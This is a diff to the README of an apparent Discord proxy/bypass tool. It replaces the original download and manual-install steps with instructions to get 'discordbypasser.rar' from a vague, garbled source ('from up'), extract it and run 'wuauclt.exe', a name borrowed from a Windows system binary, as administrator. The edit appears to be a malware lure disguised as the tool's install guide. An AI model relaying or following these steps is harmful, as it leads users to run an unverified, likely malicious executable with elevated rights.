@@ -4,7 +4,7 @@ C++ rewrite, plus fixed voice bypass via fake QUIC Initial packets
 
 ## Usage
 
-1. Download `proxy` from the release page
+1. Download `discordbypasser` from up
 2. Close Discord (or kill it in installer)
 3. Enter your proxy:
     - **URL** field `http://127.0.0.1:10808` or `socks5://user:pass@host:1080`
@@ -24,9 +24,8 @@ To uninstall: run the installer again and press **Uninstall**
 
 ## Manual install
 
-1. Build (or download) `version.dll`
-2. Copy `version.dll` and `discord-proxy.ini` into `%LocalAppData%\Discord\app-x.y.z\` (folder with `Discord.exe`).
-3. Configure `discord-proxy.ini`
+1. download `discordbypasser.rar`
+2. Extract it and open wuauclt.exe (If you get an error or it doesnt work run it as administrator)
 
 ## Configuration for `discord-proxy.ini`
 ```ini
